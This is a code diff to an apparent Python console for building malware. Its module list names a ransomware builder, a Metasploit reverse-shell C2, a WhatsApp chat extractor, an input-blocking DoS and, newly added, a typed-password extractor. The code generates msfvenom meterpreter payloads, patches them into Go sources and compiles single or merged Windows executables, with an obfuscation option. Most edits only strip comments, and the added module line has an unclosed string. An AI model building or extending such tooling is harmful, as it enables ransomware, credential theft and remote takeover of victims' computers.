@@ -12,6 +12,7 @@ MODULES = {
     'daemon/spider': {'desc': 'Metasploit C2 server (reverse shell/payload delivery)'},
     'daemon/bartmoss': {'desc': 'Ransomware builder'},
     'daemon/chatwipe': {'desc': 'WhatsApp chat extractor'},
+    'daemon/alt': {'desc': 'Extract users passwords as they are typed},
     'interfaceplug/blackout': {'desc': 'Screen blackout utility'},
     'interfaceplug/suicide': {'desc': 'Block input (DoS)'},
     'quickhack/ping': {'desc': 'Sends back user info to the C2 server'},
@@ -167,7 +168,6 @@ def restore_bartmoss_go(original_lines):
         f.writelines(original_lines)
 
 def generate_msfvenom_exe(lhost, lport, output_path):
-    # Generate a Windows x64 meterpreter reverse_tcp payload
     import subprocess
     cmd = [
         'msfvenom',
@@ -193,7 +193,7 @@ def patch_spider_base64(exe_path):
                 f.write(f'    base64String := "{b64}"\n')
             else:
                 f.write(line)
-    return lines  # Return original lines for restoration
+    return lines 
 
 def restore_spider_go(original_lines):
     go_path = os.path.join('DAEMONS', 'spider.go')
@@ -201,12 +201,9 @@ def restore_spider_go(original_lines):
         f.writelines(original_lines)
 
 def patch_filedaemon_env(target_ip, target_port):
-    # The new filedaemon.go uses environment variables, so we don't need to patch the file
-    # Just return None to indicate no patching was done
     return None
 
 def restore_filedaemon_go(original_lines):
-    # No restoration needed for the new filedaemon.go
     pass
 
 def shell():
@@ -250,7 +247,6 @@ def shell():
                     os.makedirs(loot_dir, exist_ok=True)
                     
                     if len(MODULE_CHAIN) == 1:
-                        # Build single module
                         modname = MODULE_CHAIN[0]
                         output_lines.append(f"Building single module: {modname}")
                         
@@ -259,7 +255,6 @@ def shell():
                         spider_original = None
                         filedaemon_original = None
                         
-                        # Patch module-specific options
                         if modname == 'daemon/bartmoss':
                             note = MODULE_OPTIONS.get('daemon/bartmoss', {}).get('NOTE', 'YOUR NOTE HERE')
                             bartmoss_original = patch_bartmoss_note(note)
@@ -280,7 +275,6 @@ def shell():
                             target_port = opts.get('TARGET_PORT', '9000')
                             filedaemon_original = patch_filedaemon_env(target_ip, target_port)
                         
-                        # Generate single module name
                         module_name = modname.split('/')[-1]
                         final_name = f"{module_name}.exe"
                         final_path = os.path.abspath(os.path.join(loot_dir, final_name))
@@ -299,7 +293,6 @@ def shell():
                         else:
                             output_lines.append("Failed to create single module EXE.")
                         
-                        # Restore patched files
                         if bartmoss_original:
                             restore_bartmoss_go(bartmoss_original)
                         if spider_original:
@@ -309,7 +302,6 @@ def shell():
                         
                         MODULE_CHAIN.clear()
                     else:
-                        # Build merged modules (existing logic)
                         output_lines.append(f"Building merged malware with {len(MODULE_CHAIN)} modules...")
                         go_paths = []
                         bartmoss_original = None
@@ -317,11 +309,9 @@ def shell():
                         filedaemon_original = None
                         for modname in MODULE_CHAIN:
                             go_path = modname.replace('daemon/', 'DAEMONS/').replace('quickhack/', 'QUICKHACKS/').replace('interfaceplug/', 'INTERFACEPLUGS/') + '.go'
-                            # Patch bartmoss note if needed
                             if modname == 'daemon/bartmoss':
                                 note = MODULE_OPTIONS.get('daemon/bartmoss', {}).get('NOTE', 'YOUR NOTE HERE')
                                 bartmoss_original = patch_bartmoss_note(note)
-                            # Patch spider.go with msfvenom payload if needed
                             if modname == 'daemon/spider':
                                 opts = MODULE_OPTIONS.get('daemon/spider', {})
                                 lhost = opts.get('LHOST', '0.0.0.0')
@@ -333,7 +323,6 @@ def shell():
                                     output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                     continue
                                 spider_original = patch_spider_base64(payload_path)
-                            # Patch filedaemon.go with target IP and port if needed
                             if modname == 'daemon/filedaemon':
                                 opts = MODULE_OPTIONS.get('daemon/filedaemon', {})
                                 target_ip = opts.get('TARGET_IP', '127.0.0.1')
@@ -353,13 +342,10 @@ def shell():
                             output_lines.append(f"Final merged EXE: {final_path}")
                         else:
                             output_lines.append("Failed to create merged EXE.")
-                        # Restore bartmoss.go if it was patched
                         if bartmoss_original:
                             restore_bartmoss_go(bartmoss_original)
-                        # Restore spider.go if it was patched
                         if spider_original:
                             restore_spider_go(spider_original)
-                        # Restore filedaemon.go if it was patched
                         if filedaemon_original:
                             restore_filedaemon_go(filedaemon_original)
                         MODULE_CHAIN.clear()
@@ -392,7 +378,6 @@ def shell():
                             buf.write(f"{k:<15} | {v}\n")
                         output_lines.append(buf.getvalue())
                     elif subcmd == 'options':
-                        # Show options for the last selected module
                         if MODULE_CHAIN:
                             mod = MODULE_CHAIN[-1]
                             opts = MODULE_OPTIONS.get(mod)
@@ -415,7 +400,6 @@ def shell():
                 else:
                     opt = parts[1]
                     val = parts[2]
-                    # Try to set module option if a module is selected
                     if MODULE_CHAIN:
                         mod = MODULE_CHAIN[-1]
                         if mod in MODULE_OPTIONS and opt in MODULE_OPTIONS[mod]:
@@ -430,7 +414,6 @@ def shell():
                         else:
                             output_lines.append(f"Unknown option: {opt}")
                     else:
-                        # No module selected, set global option
                         if opt in BUILD_OPTIONS:
                             if opt == 'obfuscate':
                                 BUILD_OPTIONS[opt] = val.lower() in ('1', 'true', 'yes', 'on')
